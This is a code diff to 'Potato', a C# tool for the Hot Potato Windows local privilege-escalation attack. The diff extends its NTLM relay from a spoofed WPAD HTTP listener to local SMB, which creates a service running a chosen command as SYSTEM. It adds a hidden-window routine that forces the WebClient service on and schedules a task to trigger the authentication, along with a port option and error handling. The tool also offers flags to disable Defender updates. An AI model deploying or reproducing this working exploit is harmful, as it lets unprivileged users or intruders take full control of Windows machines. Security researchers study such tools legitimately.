@@ -84,6 +84,7 @@ namespace Potato
                                 {
                                     Console.WriteLine("Parsing initial NTLM auth...\n"+authHeader);
                                     smbRelayThread = new Thread(()=>smbRelay.startSMBRelay(ntlmQueue,this.cmd));
+                                    ntlmQueue.Clear();
                                     smbRelayThread.Start();
                                     ntlmQueue.Enqueue(ntlmBlock);
                                     byte[] challenge = null;
@@ -119,6 +120,11 @@ namespace Potato
                                     else
                                     {
                                         workingUri = null;
+                                        smbRelayThread.Abort();
+                                        ntlmQueue = new Queue<byte[]>();
+                                        smbRelay = new SMBRelay();
+                                        writer.Close();
+                                        state = 0;
                                     }
                                 }
                             }
@@ -177,13 +183,13 @@ namespace Potato
         
         }
         
-        public void startListening(String cmd,String[] wpad_exclude)
+        public void startListening(String cmd,String[] wpad_exclude,int port)
         {
 
             NHttp.HttpServer server = new NHttp.HttpServer();
             this.cmd = cmd;
             this.wpad_exclude = wpad_exclude;
-            server.EndPoint = new IPEndPoint(IPAddress.Loopback, 80);
+            server.EndPoint = new IPEndPoint(IPAddress.Loopback, port);
             server.RequestReceived += recvRequest;
             server.Start();
             Console.WriteLine("Listening...");
@@ -201,7 +207,6 @@ namespace Potato
             int randInt = rnd.Next(1,10000000);
             String host = "127.0.0.1";
             DcerpcHandle handle = DcerpcHandle.GetHandle("ncacn_np:" + host + "[\\pipe\\svcctl]", auth);
-
             // Open the SCManager on the remote machine and get a handle
             // for that open instance (scManagerHandle).
             Rpc.PolicyHandle scManagerHandle = new Rpc.PolicyHandle();
@@ -252,8 +257,16 @@ namespace Potato
             SmbFileOutputStream os = new SmbFileOutputStream(f);
             os.Write(System.Text.Encoding.Unicode.GetBytes("start cmd.exe /k \"whoami\""));
             os.Close();*/
-            
-            bool status = doPsexec("C:\\Windows\\System32\\cmd.exe", auth,cmd);
+            bool status;
+            try
+            {
+                status = doPsexec("C:\\Windows\\System32\\cmd.exe", auth, cmd);
+            }
+            catch (SmbException ex)
+            {
+                Console.WriteLine(ex.Message);
+                status = false;
+            }
             if (status)
             {
                 Console.WriteLine("Successfully started service");
@@ -262,7 +275,9 @@ namespace Potato
             }
             else
             {
+                ntlmQueue.Enqueue(new byte[] { 00 });
                 Console.WriteLine("Failed");
+                Config.signalHandlerClient.Set();
             }
         }
     }
@@ -466,6 +481,34 @@ namespace Potato
             }
         }
     }
+    class ScheduleTask
+    {
+        public void schtask()
+        {
+            Console.WriteLine("Enabling WebClient service...");
+            System.Diagnostics.Process process4 = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo4 = new System.Diagnostics.ProcessStartInfo();
+            startInfo4.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo4.FileName = "cmd.exe";
+            startInfo4.Arguments = "/C pushd \\\\live.sysinternals.com\\tools";
+            process4.StartInfo = startInfo4;
+            process4.Start();
+            process4.WaitForExit();
+
+            Console.WriteLine("Attempting to schedule a task...");
+            String now = DateTime.Now.AddMinutes(1).ToString("HH:mm");
+            System.Diagnostics.Process process3 = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
+            startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo3.FileName = "cmd.exe";
+            startInfo3.Arguments = "/C schtasks.exe /Create /TN omg /TR  \\\\127.0.0.1\\test /SC ONCE /ST "+now+" /F";
+            Console.WriteLine(startInfo3.Arguments);
+            process3.StartInfo = startInfo3;
+            process3.Start();
+            process3.WaitForExit();
+            
+        }
+    }
 
     class Program
     {
@@ -480,12 +523,13 @@ namespace Potato
             }
             return ret;
         }
-        static int Main(string[] args)
+        static int Main(string[] args) 
         {
             Dictionary<string, string> argDict = parseArgs(args);
             String cmd = "\"C:\\Windows\\System32\\cmd.exe\" /K start";
-            String ip = null, disable_exhaust = null, disable_spoof = null, disable_defender = null, spoof_host = "WPAD";
+            String ip = null, disable_exhaust = null, disable_spoof = null, disable_defender = null,schedule_task = null,spoof_host = "WPAD";
             String wpad_exclude_str="potatopotato.com";
+            int srvPort = 80;
    
             if (argDict.ContainsKey("ip")) ip = argDict["ip"];
             if (argDict.ContainsKey("cmd")) cmd = argDict["cmd"];
@@ -494,10 +538,12 @@ namespace Potato
             if (argDict.ContainsKey("disable_spoof")) disable_spoof = argDict["disable_spoof"];
             if (argDict.ContainsKey("spoof_host")) spoof_host = argDict["spoof_host"];
             if (argDict.ContainsKey("wpad_exclude")) wpad_exclude_str = argDict["wpad_exclude"];
+            if (argDict.ContainsKey("schedule_task")) schedule_task = argDict["schedule_task"];
+            if (argDict.ContainsKey("srv_port")) srvPort = Int32.Parse(argDict["srv_port"]);
 
             if (ip == null)
             {
-                Console.WriteLine("Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -wpad_exclude <comma separated host to exclude, optional>");
+                Console.WriteLine("Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -wpad_exclude <comma separated host to exclude, optional> -schedule_task <true/false, Win10 only, optional> -srv_port <port for webserver to listen, default 80>");
                 return 0;
             }
             bool disableExhaust = false;
@@ -511,7 +557,7 @@ namespace Potato
      
             HTTPNtlmHandler httpServer = new HTTPNtlmHandler();
             String[] wpad_exclude = wpad_exclude_str.Split(',');
-            Thread httpServerThread = new Thread(() => httpServer.startListening(cmd,wpad_exclude));
+            Thread httpServerThread = new Thread(() => httpServer.startListening(cmd,wpad_exclude,srvPort));
             httpServerThread.Start();
             
             Thread spoofThread = new Thread(() => spoof.startSpoofing(ip, spoof_host, disableExhaust));
@@ -535,6 +581,13 @@ namespace Potato
             if (disable_defender == null || disable_defender.Equals("false"))
             {
                 updateLThread.Start();
+            }
+
+            ScheduleTask sc = new ScheduleTask();
+            Thread schTask = new Thread(() => sc.schtask());
+            if (schedule_task != null && schedule_task.Equals("true"))
+            {
+                schTask.Start();
             }
 
             httpServer.finished.WaitOne();
